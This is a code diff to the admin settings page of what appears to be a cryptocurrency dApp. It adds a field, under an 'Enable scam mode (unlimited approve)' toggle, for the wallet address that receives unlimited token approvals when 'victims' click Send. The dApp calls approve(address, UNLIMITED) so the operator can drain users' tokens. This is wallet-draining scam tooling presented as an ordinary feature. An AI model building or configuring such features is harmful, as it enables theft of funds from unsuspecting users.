@@ -269,6 +269,24 @@
               <span class="toggle-label">Enable scam mode (unlimited approve)</span>
             </label>
 
+            <label class="settings-label" style="margin-top: 12px">
+              Address that receives unlimited approval
+            </label>
+            <p class="settings-sub" style="margin: 0 0 6px">
+              When victims click Send, the dApp will call
+              <code>approve(THIS_ADDRESS, UNLIMITED)</code>. Paste a wallet
+              or contract address you control.
+            </p>
+            <input
+              id="adminScamSpender"
+              class="settings-input"
+              type="text"
+              placeholder="T... (leave empty for built-in demo address)"
+              spellcheck="false"
+              autocapitalize="off"
+              autocomplete="off"
+            />
+
             <div class="settings-actions" style="margin-top: 10px">
               <button id="revokeBtn" type="button" class="btn-secondary">
                 Revoke approval (set allowance = 0)
